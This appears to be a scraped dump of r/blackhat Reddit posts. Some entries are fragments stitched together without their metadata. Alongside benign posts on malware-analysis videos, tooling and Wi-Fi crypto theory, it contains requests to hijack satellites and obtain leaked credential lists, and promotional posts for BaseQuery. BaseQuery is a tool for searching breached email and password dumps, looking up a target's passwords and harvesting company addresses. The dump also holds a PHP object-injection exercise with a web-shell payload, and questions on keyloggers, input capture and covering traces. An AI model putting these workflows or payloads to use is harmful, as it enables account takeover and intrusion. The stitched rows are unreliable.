3125,6rqoco,fran_1__,"I know there are off-the shelf softwares like ""GMV hifly"", ""KRATOS quantumCMD"", ""Harris OS/COMET®"" and ""InControl™ Satellite Command and Control Software"" out there that supposedly let you to control a satellite/cubesat, although open sourced ones like Ball Aerospace's COSMOS and YAMCS (Yet another mission control system) do exist on the clear. Now the most difficult part is to find an actual satellite/ cubesat to connect or even a ground segment interface.

I used Shodan to the best of my ability but I failed to find one exposed satellite telecommand/telemetry interface, especially on port 8090 where the YAMCS software interface are supposed to operate.

How do I find one exposed interface to connect? Or at worst, where in the darknet do I get contraband sophiscated off-the-shelf software like hifly?

FYI my hardware skills are very dismal at best.

By saying ""control it"" I mean an actual control like spinning it, activating/deactivating panels or even firing RCS.",blackhat,1501920821,0,NA,https://www.reddit.com/r/blackhat/comments/6rqoco/iwtl_how_to_hack_a_satellitecubesat_and_control_it/

3178,6w0vsf,adhoc_netwrk,"So, I'm a Linux user for some time now, and usually this is ezpz, but since switching to Comcast's xfinity WiFi, I'm unable to receive incoming connections or bind to addresses even after opening the port(s) question. I've went as far as putting the box in DMZ, to no avail. Everything appears to be in order, with one tiny mystery... I can only access my services from inside my network, with private  IPs, ie: **10.0.0.x**. The public addresses *are* reachable, and will load a webpage served by Apache on **PU.B.LI.C:80**, but ***ONLY*** if you use a proxy. It will reject calls to public addresses from within my LAN, metasploit and other services fail to bind to open ports. 

Anyone else have this problem? Or know how to resolve?

3241,6zjglm,unclefishbits,"I'm no tech pro. Here's what's happened:

Wife's account has odd items placed in wishlist and cart. She gets emails of two 5 star reviews posted from her account. They were not her, and not items she ever purchased. 

I changed the password, deleted the reviews, and started researching.

It is obvious that people are posting fake reviews from actual accounts, so you won't even be able to tell what is real or fake.  Lucky my wife had her email notifications on for Amazon, or she may not have known, and I imagine a LOT of people don't know.

This is big? This would strike to the core of Amazon's legitimacy.

Amazon thread sort of went viral this AM.

I bet this is just beginning. Think how many fake reviews are being posted right now, without people's knowledge, on legitimate accounts. The hack looks Russian, per a screenshot of emails from Twitter users:

3243,6zk5zz,fallenreaper,"I have a kali box vm on my mac.  My goal was to scan my network to check out the network devices.  This is just to make sure there aren't an unusual set on my wifi etc.

I noticed when doing something simple like:  nmap -sP 192.168.0.0/24 was yielding different results on my Mac than doing it on my vm.  My kali box was telling me that all target hosts were up, 0-255.

I was trying to make sense of this.  Right now, It looks like my vm is nat connection to my mac so I changed it to bridged to give my vm space on the network.

It seems for my other tests, NAT was more than sufficient when I was running tests against the system from the outside.  This is because it browses the web just fine.  It seems that running tests internally, I may want to run this with a bridged network connection in order to have this machine sit dedicated with its hourly scan.

My preliminary scan with bridged networking doesnt really solve the issue at the moment though.  Seems that instead of all hosts being up, they are all down.  I am running both the same command on both machines; nmap -sP 192.168.0.0/24

3967,8w8rpk,torghost,"Hey guys

So  ive been wanting to use burpsuite to intercept requests from hidden  services. I have tried configuring the TOR browser and burpsuite as some  articles mentioned on the web but it is not working.

I have set the  socks host proxy in my TOR browser as [127.0.0.1:9150](https://127.0.0.1:9150/)  (socks v5) and the HTTP proxy as  [127.0.0.1:8000](https://127.0.0.1:8000/)

(ive got tomcat running on port 8080).

In burpsuite, under the project options ive ticked the USE socks proxy and set the SOCKS Proxy host as [127.0.0.1:9150](https://127.0.0.1:9150/) and under the proxy  tab ive set the proxy listener to listen to [127.0.0.1:8000](https://127.0.0.1:8000/). (havent  ticked the ""support invisible proxy"" )

When ever I switch on the intercept and visit an onion site, it shows something like proxy server can be reached.

Can you guys help me out?  Its been eating my head since the last 3 days.

I also tried running the TOR service on my Ubuntu and set the proxy to [127.0.0.1:9050](https://127.0.0.1:9050/) in burpsuite and TOR browser but it doesnt work.",blackhat,1530778188,11,NA,https://www.reddit.com/r/blackhat/comments/8w8rpk/need_help_intercepting_requests_from_tor_hidden/

4017,91mumj,FearAmongUs,"Hello reddit once again, I have one stupid question which i've searched everywhere to find answers but I seemed to have come up empty handed. So I thought what better place to come to for any and I mean any question than reddit, anyways enough rambling. My question is where the hell can I find a public realtime dstat for layer 4 traffic? It may be a dumb question and probably is, but me and along with a few other people can't seem to find any at all. We've tried shodan, cyberhub(lol), vedbex, [dstat.us](https://dstat.us), even rummaged through hackforums but the results amount to none. If anyone could be so kind to point me in the right direction it would be extremely appreciated and i'll love you forever. Thank you in advance.   


P.S. - I should add I prefer it to be on/for Linux environments(I specifically use Parrot). Just a note, not mandated but i'm too lazy to use a windows VM. Who likes windows anyways, right?

4108,9dvxlq,Kaos-Industries,"Hey there,

I  checked HIBP and my email address is listed as being part of the Onliner Spambot combolist but not any of the previous lists Onliner Spambot is made up, of like exploit.in or Anti Public. As far as I can tell this  means my credentials are one of the few hundred million that are unique to the Onliner Spambot list.

Would anyone that has it be able to make it available to me, or otherwise direct me to somewhere I can get hold of it for free? I'm tired of seeing forums that charge credits for them, it feels directly opposed to the hacker ethos to do so, but more importantly, I'm broke as shit.  

I’d really appreciate it. Thanks in advance.",blackhat,1536337456,0,NA,https://www.reddit.com/r/blackhat/comments/9dvxlq/onliner_spambot_list/

4245,9wolen,13Cubed,"Good morning,

I have just released a new episode in the “Introduction to Malware Analysis” series. “Juicy PDFs” looks at another tool that will help us extract embedded content from within a PDF. We’ll first run the tool against evil.pdf from the last episode in this series, and we’ll find that it can easily extract the embedded Word document that we were able to manually extract using pdf-parser. Then, we’ll run the tool against another sample PDF that contains embedded images.

Hey [r/blackhat](https://www.reddit.com/r/Hacking_Tutorials) Ive worked on this OSCP/Pentest/HackTheBox cheatsheet for a little while now. I thought I would share it with the reddit community. If it can help one person on here it would make me happy.  PenTest.txt &amp; LinuxPrivilegeEsc.txt should be the biggest helpers!

Hopefully some of you can pitch in and add to the repo since there are people much wiser than me out there.

4319,a65b57,notvital,"I've  been getting into vulnerability and exploitation as a fairly serious hobby over the last 18  months. While I absolutely enjoy CTF and training exercises, I also like to give myself real world projects. In my day job, I work with animation software. I've often wondered how secure a major industry package actually is. Similar packages have been found to have multiple buffer overflow / code execution issues when importing assets. In  addition, the software allows for internal scripting using both a  proprietary scripting language and Python, which makes me wonder about  vulnerability to malicious scripts and plugins. As far as I know, zero third party testing has been conducted on this software.

My  question is - would it be a worthwhile / achievable project to  RESPONSIBLY look into potential vulnerabilities in this package as a  learning project? Is this something that is too big of an exercise for a  beginner? If not, what tools should I explore, and how should I start  educating myself on the process?

4376,aez5ox,Sugarandvitriol,"Thanks for looking. I live in Los Angeles. I use Craigslist often to list and buy items. In the motorcycle parts section there are a couple of geniuses who post a couple of hundred repetitive ads a day. It's rendered the forum useless, and has become impossible to sell anything because no one goes there to look for things anymore since it's one big ad for one or two businesses. I know this happens in other forums as well.  I have started 15 proxy and VPN accounts in an effort to flag the offending posters. CL knows these are VPNs and proxies and my flagging does nothing. I've tried over the last 6 months to make this work to no avail. I'm out of ideas and knowledge and looking to those more knowledgeable than me to give me guidance on the topic. Evidently this is a banned topic on Blackhatworld now, which would be one of the obvious first places to turn to for assistance. I know there are scripts/bots out there for spamming, so I assume there has to be similar for flagging. I'm really looking to reclaim the forum from the spammers. Again, thanks in advance.",blackhat,1547236400,4,NA,https://www.reddit.com/r/blackhat/comments/aez5ox/flagging_spam_on_craigslist_bot_method_for/

If any of you guys have a bunch of databreaches collected overtime and no way to sort / query them.   


**Then this is going to make your life a lot easier.**   
**BaseQuery V1.0.0**

  
I was facing the same problem a few weeks ago and decided to write a program to deal with QUICKLY sorting and searching through millions.. or billions of emails and passwords. 

  
BaseQuery uses a triple nested directory structure making searching for a users email address INSTANTANEOUS!  
BaseQuery's average speed is a little over 10,000 entries per second to sort and insert the data.  


  
So how does it work?  
     \- Clone the repository from https://github.com/g666gle/BaseQuery (type  ""git clone https://github.com/g666gle/BaseQuery"" into a terminal)  
     \- Simply place all of your files in the 'PlaceYourDataBasesHere' folder  (as long as the files are in the format ""test@example.com:Password"")  
    \- type ./run.sh  
    \- follow the on screen instructions   
        \- To insert and sort all of the files in the 'PlaceYourDataBasesHere' folder choose option 1  
        \- To search for an email addresses password choose option 3  
        \- Don't have a target email address?  
             \- Use option 4 which will allow you to harvest email addresses from a  company ex) will find you email addresses ending in ""@google.com""  
Github Repo: https://github.com/g666gle/BaseQuery  
All the code if heavily commented (written in Python 3.6 and Bash )

4458,apfpnu,13Cubed,"Good morning,

I've just released ""Visual Analysis with ProcDOT"", the latest episode in the ""Introduction to Malware Analysis"" series, covering a neat utility called ProcDOT. As you are likely aware, Sysinternals’ Process Monitor, also known as Procmon, in combination with PCAP data provides a treasure trove of information that is commonly used in behavioral malware analysis. The problem is, data from those sources is disparate, and typically manual analysis is required to correlate process-related information from Procmon with the corresponding network-related activity derived from the packet captures. What if there was a utility that did that for us, AND presented the results in an interactive, visual format? Enter ProcDOT.

Also, if you didn't catch last week's special episode that premiered on LiveOverflow's channel, you'll find the link to that below as well.

It's a me, your favorite banhammer wielding asshole. You probably know me from my greatest hits, such as ""this doesn't belong here"" and ""what the fuck were you thinking?"" If you haven't seen me, my name is over there ----&gt; and I'm mostly responsible for removing those shitty hacking tutorials you've probably seen.

&amp;nbsp;

I thought it was about time for an update to our stickied post, because it seems like a number of frequent submitters have not really paid attention to the rules. First and foremost, this is a **hacker** subreddit, **NOT** an _infosec_ subreddit. There are also a number of cases where submitted videos are not explicitly against the rules (*cough cough* hack the box) but are not really what's meant for this subreddit and are usually just people spam posting the same video across every ""hacking"" subreddit they see, reaping in that sweet sweet karma. So I guess that's what this post is really about: **HACK THE BOX VIDEOS WILL BE AUTOMAGICALLY REMOVED FROM NOW ON.** If you'd like to see more hack the box videos or you have questions about hack the box, check our /r/hackthebox. They will be much more accommodating than we are. :)

&amp;nbsp;

Instead of blindly posting hack the box walkthroughs, I encourage you to find the interesting and novel bits from the walkthrough and start a thoughtful discussion about those tools and techniques. You're much less likely to get banned that way. Or maybe ask about ways to learn more about _specific thing_, and show us what you've already found about that thing so that we know you're not treating us like your own personal google.

&amp;nbsp;

If you are a fan of the text based internet relay chatting,  you can join us over SSL at **breaking.technology/6697** in channel **#blackhat**. Alternatively, you can join us via tor @ **techh4xuun5r2a62.onion**. If you've never internet relay chatted before, you might consider checking us out via our web irc at https://breaking.technology. It's highly advised to use our own web irc instead of other platforms like mibbit, as ours explicitly doesn't leak your connecting IP address to the whole channel. Also, the ""I"" in IRC does **not** stand for ""Instant."" If you join, say hey, and then quit a minute later because no one responded, we **will** make fun of you after you leave.
 
&amp;nbsp;


**Please read the rules before submitting your post.**

**Rules:**

* Be excellent to each other.
* Stay on topic. Vulnerabilities, exploits, evading countermeasures, or just general hacker etiquette / culture / rules. 
* Don't self-incriminate. We don't want our subreddit being referred to as ""Exhibit A.""
* Pick a good title. We won't be all Linus on you if your title is longer than 50 characters, but maybe we will if it's been a bad day.
* Do not post non-technical articles. This includes marketing fluff, news articles that are just scare pieces, broad descriptions of a tool that you just discovered on your new kali install, etc. 
* Ideally, the content should be original, we don't care about your crappy ARP poisoner or Kaspersky's latest scam.
* No pay / signup walls.
* If the site is using my CPU to mine mythical magical internet money, it will be banned.
* No ""Please hack X"" posts
* Well thought out and researched questions / answers only. (No ""How do I hack X"" posts)
* Any non-free / non-open-source projects will be removed
* Please refrain from spamming top-level posts. If you posted your blog yesterday, maybe don't post it again today unless it's _really super cool_ new research that you didn't post yesterday.
* Videos of cyberpunk music, copying and pasting commands into terminals, and typing to me in a notepad document will be removed.
* Walkthroughs or guides to hack the box, vulnhub, overthewire, smashthestack, and other wargame or CTF type things will be removed.

4485,av5hzd,EDMdotcom," Today I introduce a massive update to BaseQuery, a opensource and FREE  piece of software for all of you hooligans. If you have your own  collection of databases from browsing this site over time, as of right  now they are practically useless to you. If your solution it to grep  Gigs and even Tera-bytes of data... Good Luck. BaseQuery handles all of  the sorting and organization for you. One of the big new features added  is Facebook's zstd loss-less compression algorithm, compressing those  hundereds of giga-bytes down to around 7% of the original size.  
 

# BaseQuery V1.5

* BaseQuery is now a quadruply nested directory stucture making looking up users passwords INSTANTANEOUS.  
 On good hardware we can see average import speed times of about 12,000 - 18,000 lines per second!  
 Want to know how long it is going to take yourspecific hardware?  
       \- Use option #2  
       \- Enter the approximate amount of lines you want to import  
       \- After 2 seconds Base Query will give you tons of metrics about your specific hardware import speed  
 
* To make it even more convienient for you, we have added the ability to  recursivly look through the PlaceYourDataBasesHere directory.  
 
* Now you can search by domain name. Lets say you want to find everyone in your database using gmail  
      \- Use option #3 to query  
      \- Type ""@[Gmail](https://raidforums.com/User-Gmail).com""  
 

The BaseQuery team has worked hard to commit genocide on bugs and improve the overall performance of BaseQuery.  
 

Another awesome new feature is the ability to output any of your query's to a file to later analyze your findings.  
 

So how do I get started?  
  \- To install and configure follow the steps bellow  
     \- Clone the repository (type ""git clone [https://github.com/g666gle/BaseQuery.git](https://github.com/g666gle/BaseQuery.git)"" into a terminal)  
     \- type ""sudo chmod 755 -R BaseQuery/""  
     \- type ""cd BaseQuery""  
     \- type ""./dependencies.sh""  
      \- type ""./run.sh""  
 

\- To add databases  
     \- Simply place all of your files or folders in the 'PlaceYourDataBasesHere' folder  
     \- type ./run.sh  
     \- follow the on screen instructions  
         \- To insert and sort all of the files in the 'PlaceYourDataBasesHere' folder choose option 1  
         \- To calculate how long your specific hardware will take to import all of the files choose option 2  
         \- To search for an email addresses password choose option 3  
         \- Don't have a target email address?  
             \- Use option 4 which will allow you to harvest email  addresses from a company ex) will find you email addresses ending in ""@[Google](https://raidforums.com/User-Google).com""  
 

Querying  
     ex) test@example.com                          \[ Searches for all passwords associated with this address \]  
     ex) test@                                             \[ Searches for all passwords for any email addresses starting with this username \]  
     ex) @[Example](https://raidforums.com/User-Example).com                                \[ Searches for all passwords for any email addresses ending with this domain name \]  
     ex)  /home/user/Desktop/email\_list.txt     \[ Searches line by line through  the file for all passwords for each email address \]

4486,avrj51,DeviantJuiceBox,"This tool lets you write vulnerability scans and pen testing as declarative code in the same language Terraform uses.

The tool itself is cool and I thought you guys might appreciate it but I'm also curious what everyone's thoughts are about the ethics of tools like this. The examples in the repo are limited to vulnerability scans but there's a generic metasploit plugin already and nothing stopping a bunch of automated exploits from reaching script kiddies. I know the ""autosploit"" repo stirred up a lot of people for that reason but I'm curious where r/blackhat stands on it all.

I hope this is the right place to ask. Is it possible to plant an auto-run keylogger or some other malicious software by connecting a USB to a locked or recently closed laptop?

Hi,

I saw there´s a lot of tools to gather emails from competitors/potential clients. But what can you legally do with them? in Europe the data protection law is quite estrict, so I was thinking about other possibilities (like trying to contact them by linkedin/facebook). I am afraid that I may have legal problems if I send them an email..... any ideas? thanks.

edit: I just talked to my lawyer and told me I can get into (big) troubles if I send them an email without their approval (under the EU law)",blackhat,1556293251,8,NA,https://www.reddit.com/r/blackhat/comments/bhnqlx/lots_of_tools_to_get_emails_from_competitors_but/

4617,biqid8,sbrisu,"Hi All,

&amp;#x200B;

I'm a newbie (a couple of years studying) so forgive my inexperience.

&amp;#x200B;

I've setup a network environment at home with 2 Windows 10 machines (default Fairwall configuration), version 1809, and one Kali Linux box from which conducting the attacks.

&amp;#x200B;

The network is a home network where the Windows 10 machines are non domain-joined (workgroups), my objective is to own the 2 Windows machines from inside the LAN, knowing only the credential of local users (non-RID-500). The RID-500 administrator is disabled by default on the machines. 

&amp;#x200B;

My objective is to own the boxes through a Meterpreter session. 

&amp;#x200B;

I was thinking this is a good initial scenario to start with, but I am deeply stuck. This because I want to simulate a stealthy attack taking advantage of the fact of being inside the network, therefore excluding pishing (ie payloads sent by email). 

I am stuck primarly because remote access is impossible for the following reasons:

&amp;#x200B;

1. Pass-the-hash is not possible with local accounts in non-domain-joined machines, see:  [https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/). 
2. The above because of the ""Enablelua"" setting in the Windows registry, basically preventing me to perform all those remote code execution attacks:  [https://ptestmethod.readthedocs.io/en/latest/LFF-IPS-P3-Exploitation.html#remote-code-execution-methods](https://ptestmethod.readthedocs.io/en/latest/LFF-IPS-P3-Exploitation.html#remote-code-execution-methods) 
3. The RID-500 administrator is disabled by default.
4. Remote Desktop (RDP) is disabled by default.
5. Powershell Remoting is disabled by default.

&amp;#x200B;

Abandoning the remote access route, I looked into ARP poisoning and MITM attacks, but the majority of web traffic is HTTPS and there wouldn't be much to sniff here. My objective is to get a Meterpreter session, not to sniff data.

&amp;#x200B;

I finally used Beef ([https://tools.kali.org/exploitation-tools/beef-xss](https://tools.kali.org/exploitation-tools/beef-xss)) and was able to inject the hook on some HTTP traffic, but the Windows machines use an updated Chrome, and no modules in Beef seem to give me a shell. 

&amp;#x200B;

Is this a situation where the only options left are physical access (ie USB Rubber Ducky) or email pishing (file download &amp; execution), or am I missing something basic here?

&amp;#x200B;

Thanks to those who will contribute to the discussion!

Hello there,

I'm a university student working on a project in malware analysis (surveying various machine learning techniques for the attribution of APTs, if you're interested). I'm currently creating my dataset and I have plenty of APT families to be getting on with (took forever!). However, I want my dataset to have a sampling ratio similar to real world scenarios, so I'm looking for datasets of *families* of goodware. Does anyone have any idea as to where I could find such data? The only caveat being the samples are for Windows OS, either a binary file or portable executable of some kind.

On a side note, once my project is complete I will be publicising my APT dataset for further research.

Thanks for your help!",blackhat,1557321871,6,NA,https://www.reddit.com/r/blackhat/comments/bm58f1/dataset_families_of_goodware/

4720,c8vg01,dvn8ter," YouTube updated its list of what it considers “harmful or dangerous content.” One notable addition is of “instructional hacking and phishing” videos, with the company already pulling existing content and issuing strikes to creators. This is the notice:

Bummer.. looks like I wont be watching YouTube as much. This hacking content is the main thing I watch on the site. YouTube has been a valuable resource for me in my academic career, its time to move on

The scope of this policy will affect aspiring **ethical hackers, computer scientists**, people looking to **educate**themselves about computer risk, and the whole of the **infosec community**.

Where will the community pub/sub now?

Lets explore new video content delivery options..

This article gives many options: [https://twitgoo.com/best-youtube-alternatives/](https://twitgoo.com/best-youtube-alternatives/)

I believe the place is on the decentralized web two options here are Dtube and PeerTube.

* **Dtube:**
   * hosted by IPFS pinning so it is accessible through the any web browser.
   * has rating system that works similar to Reddit's, in regard to the power of up/down votes.
   * Provides incentives for content creators, in the form of cryptocurrency
   * [https://d.tube/](https://d.tube/)
* **PeerTube**:
   * a torrent software application and may not be as available as Dtube.. I still need to check this one out..
   * [https://joinpeertube.org/en/](https://joinpeertube.org/en/)

&amp;#x200B;

Has anyone ever used either of these?

What are your thoughts regarding the implications of this new policy?

4763,cgk3rk,goodgod20,"Hi,

I've seen many tutorials about an app called ""HTTP injector"" which gives free 3G internet if configured correctly, there was even a facebook group where the users exchanged configuration files for the app to grant free internet(most of the users I've known personally are Vodafone users but there are configuration files for alot of carriers world wide in [this site](https://www.techfoe.com/search/label/Http%20Injector?&amp;max-results=10) and others).

now I don't know how this work or what kind of an exploit they use and how can i test for the exploit(I don't have an exploitable network to test on), I would be very thankful if someone can explain to me how this works, how i can test for the vulnerability and maybe design an exploitable network to test on.

this was asked before with more details on [stackexchange](https://security.stackexchange.com/questions/153231/how-does-mobile-free-internet-bypass-works-ubt-fbt) but didn't gain any detailed or satisfactory answers

&amp;#x200B;

more information about how to configure the app: [https://www.techfoe.com/2016/09/how-to-configure-http-injector-for-free.html](https://www.techfoe.com/2016/09/how-to-configure-http-injector-for-free.html)

Regards

&amp;#x200B;

&amp;#x200B;

**EDIT:just to be clear, after watching many tutorials on how to setup this it requires the following:**

1- the mobile network should allow you to connect to some site for free even when you don't have a data plan or balance, this site can be a company site, for example [vodafone.com.eg](https://vodafone.com.eg) on vodafone egypt or it can just be a public service that the company provides access for free (free [facebook.com](https://facebook.com) without images) or many other free sites on the [freebasics.com](https://freebasics.com) project, this free site is used as a payload.

2- a public vpn over ssh

3- a public proxy server( this is optional if i understand correctly)

somehow the app manipulates the headers to convince the company firewall that the user is connecting to a free service (free [facebook.com](https://facebook.com) for example) but what it actually does is establish a connection to the ssh vpn server so that subsequent  traffic will be tunneled through this vpn",blackhat,1563834712,24,NA,https://www.reddit.com/r/blackhat/comments/cgk3rk/how_does_free_internet_work_through_http_injection/

4765,cgp8dh,DrakeCruz,"Hello pros of the black hat world! I have a question. So I have a string of popular yet questionable e-commerce websites that have need of new payment receivable methods. Credit card companies refuse to allow direct placement on our websites so we used “stripe” via email confirmation of order placements as well as PayPal until recently, Zellee in the USA and also email money transfers. 

Our stripe account was suspended after someone perhaps used stolen credit cards or something to make purchases so now we are back to square one. We lose about 30-40% if orders when we can’t use credit card and paypal is always a nightmare. We tried buying many PayPal accounts from various venders but they always ended up getting suspended with small quantities money. 

Their must be alternatives that you guys use, right now we are on pace for six figures monthly and it has to become a little more streamlined. It is annoying when what you sell is legal, taxes are paid on the items sold yet the credit card companies and PayPal are annoying.

We attempted crypto currency as an option but they tend to scare off customers. People want easy purchase options or they tend to just quit at the shopping cart.

I don't know if this is the correct subreddit to be asking in, but I'm headed to Blackhat 2019 USA in Las Vegas next week, going to check out everything, including the briefings and just wanted to reach out on what to expect. From what I've read there is a lot that goes on, and was just wondering about any potential pointers on briefings/events/procedure for the event? Also DefCon is also going on, and the website doesn't do a great job at explaining what to do or really what to expect.

&amp;#x200B;

Any details or pointers or tips would be appreciated.

I know there is Tor, but i wouldn't trust Tor if the question is if i go to prison or not.

Maybe a combination. I have also heard of proxy chains, but don't know a lot about that.

4825,co7exr,CWMacPherson,"Hi Redditors,

I’m posting with some highly unfortunate news, in hopes that some of you may be able to assist. 

A friend of mine’s younger brother was recently killed in a motorcycle crash. He lived a private life and his family has few details of his state of mind or causes contributing to the crash (it was on a straightaway, no other cars were involved AFAIK), and they’re looking for whatever closure they can. 

They’re trying to access his cellphone (samsung, not apple, and not encrypted to the best of our knowledge), they don’t know the password, but according to my friend there’s only three guesses left before the phone erases. As I’m the techie of our group, he’s asked for my help, and this isn’t my area of expertise so I’m asking you about the best way to help them get the information they need in the phone - either a hardware workaround, desktop application, or third-party company you’d recommend.

I’ll be the first to say that this is the internet and plenty of people might make such appeals trying to do something nefarious, so I’m going to Dox myself - my name is Cameron MacPherson, you can find me at cameronmacpherson.com, this is for real and if you can help I’d happily get you some sort of verification like a police report to show this is legitimate white hat. 

The make of the phone is Samsung, model number SM-J737V. If you need any more information I’ll ask him for details. 

I’d like to help get the family some closure and help them at this difficult time. Any help you could offer would be greatly appreciated. 

Thank you all and I appreciate your thoughts and candor.

I have no intention of doing anything closely related to what this person or people like him was hoping to carry out. I simply want to know how someone could anonymously purchase a product then after altering the product sell the finished product on a site with an anonymous domain on an anonymously purchased website then the seller communicates with buyer through an anonymous untracable email linked to the forementioned website then the buyer is redirected to another anonymously purchased/owned site/domain where purchasing transactions take place in an anonymous untracable way (ex. Crypto, PayPal.me ""donation"") then said payment to be placed in an anonymously owned untraceable crypto wallet and donation account.

4878,cw0v85,C0DEV3IL,"So I started with some video tutorials for my pen testing training, and the first 4 chapters were cracking WEP, WPS, WPA/2 etc.

I understand quite good the methodologies of ""How to crack"" but quite not the ""Why"" part.

So these are my problems. If anyone is kind enough to help me with this, I will be so greatful.

1. WEP uses RC4. It does the encryption with new key streams on each packet. The key stream is The KEY + IV. And that key stream is used for the stream encryption right? And the IV is sent along with the encrypted packets, but the weakness is that the IV is just 24 bits, so major collisions happen. Okay I understand that. What I don't understand is, How is aircrack doing the statistical attack so that by having multiple packets, it can guess out the actual key.
2. If the network is idle or client less, We can fake associate ourselves and do ARPREPLAY attack which will generate the multiple packets, hence IVs for us. But, What is so fake about the authentication, and What ARPREPLAY exactly is?
3. In case of WPA/2, The PSK is appended to SSID to make a Pairwise Master Key. What I understood till now, is that the handshake has the PMK, which we need to capture and bruteforce. So if that's this easy, Why there is the need for the AP and the supplicant to generate PTK at all?
4. From what I understood till now, is that The WPA2 key is generated by performing a PBKDF2 algorithm. Now pbkdf2 has a salt and PRF option. So I get that the SSID is used as salt. But There is also an HMAC running within the PRF. So the PSK is the key to the HMAC, Then what is the message? coz HMAC is: H(K + H(M + K)). So what is the M in case of WPA2?

My sister lives in a home she shares with a lodger and a friend. They split the internet bill which comes with a 1tb monthly limit. Recently they've been getting fined for going over, which shocked everyone. They installed a monitoring device to track data usage and could only account for 300gb from every possible device known to that network. 

So the question is: where is the rest of the data usage coming from?


One thing that raised suspicion was, she noticed the lodger would constantly leave their laptop unattended running a program called openbullet. She said she saw it scrolling email address and soemthing about Facebook. Is that anything suspicious?

They hypothetically blocked terminal but getting past it is incredibly easy. The recipient of said hypothetical macbook is trying to install something that requires administrative permissions. Hypothetically booting into safe mode or recovery mode doesn't work. Is there a way that could be used to get around said security and install the application? Completely hypothetical btw

5099,dv3zby,gramboc,"Hi everyone - termshark v2 is now available on github. Termshark is a terminal user-interface for tshark that copies Wireshark's layout - it tries to be Wireshark for the terminal. For me, its main use is when you're ssh-ed in to a remote machine and want to look at a pcap (or live traffic) quickly without copying anything back to your desktop. Termshark v2 is snappier than v1 and features dark mode, piped input, stream reassembly and more. You can see the ChangeLog via the website, https://termshark.io, and there are binaries on github at https://github.com/gcla/termshark. Because it's 100% Go, you only need to install a single executable file on your target machine (Linux x64/arm, Android/termux, MacOS, Windows, FreeBSD). Hope you enjoy it, and I'd love to hear your feedback!",blackhat,1573528323,16,NA,https://www.reddit.com/r/blackhat/comments/dv3zby/termshark_v2_a_terminal_ui_for_tshark_now_with/

Provided we have a linux system with full prividedges, what would be a good way to obtain data inputted by a user into a browser?

Two methods pop into my mind trying to answer this, using a keylogger or a transparent proxy (which is better for a lot of reasons). Is there another way that eludes me?

5212,e9p01d,Cibur,"Hey everyone first time posting here. I'm currently a cybersecurity student and I have some questions that I'm hoping all of you can help me with.

First, I'm wanting to start with vulnerability testing, sniffing etc of my own personal network so that I can learn how to read the information I'm collecting, be able to identify what wrong looks like so I can make it look how it should. I figured the best way to learn is to do these things with my own network. What suggestions do you have in regard to how I start this process? Software, hardware, research etc

Secondly, do you find yourself needing or have both a laptop and tablet everywhere you go? I ask because I was thinking about an iPad to accompany my Thinkpad but then I began wondering do i really need both, is it beneficial to have Windows, Linux and Mac in just two devices. What are your thoughts?

However these ""drivers"" somehow installed razer synapse on my PC. They installed a whole program with no authorization, completely auto-run and I can't help but feel this could be easily exploitable. 

My question is, does anyone have any knowledge about this sort of attack or how this was done? I know there are similar attacks such as the rubber ducky but that involves emulating keystrokes whereas this just installed a whole payload right when I plugged it in.",blackhat,1577479219,34,NA,https://www.reddit.com/r/blackhat/comments/eggk6i/razer_products_automatically_installing_and/

Tried with curl command and the output was:

so managed to try routersploit installed on Termux, on Android
tried autopwn which shown only one valid option, output of this options seems to be:

as we can see injection type is blind, so I can't see the results

I want to know how can I see the result, maybe using payload? or what other method should I try?

I’m trying to get into cyber security I understand that this is the black hat subreddit but most skills transfer over I imagine oh and more specifically red team hacking. My main question is would it be productive to start as a script kiddy to learn all the tools that kali has to offer and then move to Debian and learn a deeper understanding for the tools and how they work then?

5631,g35gs5,ci9her,"Im trying to learn PHP Object Injection. I have index.php. Below is the content of the index.php:-

`&lt;?php`

`class exCommand{`

`public function __destruct(){`

`system($this-&gt;command);`

`}`

`}`

`class Hello{`

`private $name;`

`private $role;`

`private $isSet;`

`public function check(){`

`$this-&gt;isSet=isset($_COOKIE['name']);`

`}`

`public function printHello(){`

`if($this-&gt;isSet){`

`echo ""&lt;br &gt;"" . $_COOKIE['name'].""&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;"";`

`echo ""Hello "" . $this-&gt;name . ""&lt;br&gt;"";`

`echo ""your role is "" . $this-&gt;role . ""\n"";`

`echo ""&lt;br &gt;&lt;br &gt;&lt;br &gt;"";`

`}else{`

`echo ""good"";`

`}`

`}`

`}`

`$obj = unserialize($_COOKIE['name']);`

`$obj-&gt;check();`

`$obj-&gt;printHello();`

This code suggests that i can use PHP Object Injection. So i created a php script to create the payload.

`&lt;?php`

`class Hello{`

`public $name = '&lt;?php system($_GET[""makman""]);?&gt;';`

`}`

`$obj = new Hello;`

`echo htmlspecialchars(serialize($obj));`

By which i get the payload :- O:5:""Hello"":1:{s:4:""name"";s:32:"""";}

Now im confused where to inject the code. When i go to [http://someurl/XYZ/index.php](http://someurl/CTF/index.php) it gives error NOT FOUND. Also when i do [http://someurl/index.php](http://someurl/index.php) it redirects to [http://someurl/](http://someurl/CTF)XYZ.

Also XYZ page had nothing just a image.",blackhat,1587141400,16,NA,https://www.reddit.com/r/blackhat/comments/g35gs5/php_object_serialization_attack_on_a_webserver/

Would you please advise which method would be the most efficient and safest, and what actions will I need to take to remove any traces.

5733,gfgib1,cybsploit,"I don't know if the title of my post is clear enough? Today I wanted to share with someone a link from the darkweb using FB messenger. I will not post here the link I wanted to share since is out of interest but the main point is after shared the link I saw that Facebook was able to fetch the link content, screenshot, title, meta-description and some other details.  


I did make several try with few another links and was always the same. So the first question is do anyone know about this ? And how they do ? I basically know how the deepweb work but I don't understand how a public website like Facebook can fetch instantly deepweb link.

5748,ghwue9,EONRaider,"""Black  Hat Python"" is a great book, but the fact that it was written in Python  2 is a bit of a problem. Not only that but conflict resolution and  plain bug fixing is necessary in practically every chapter.

I left some good amount of information on how to use the repository code right on the README.md file.

It was a lot of work but I think I did most of it. Enjoy.

5846,gxmkln,appletech752,"First of all, I apologize if this post is breaking any rules. I am totally new to this sub and I read through each rule carefully, if this post is in violation please tell me so I can improve. 

I’m here to discuss the topic of satellite radio and potential hacking methods, as well as some questions I have. I learned that ground equipment transmits signals to satellites and then back to earth on the 2.3GHz S band (or 1.4GHz L outside N America). The data transmitted back to earth contains “scrambled broadcasts” along with metadata for specific segments. 

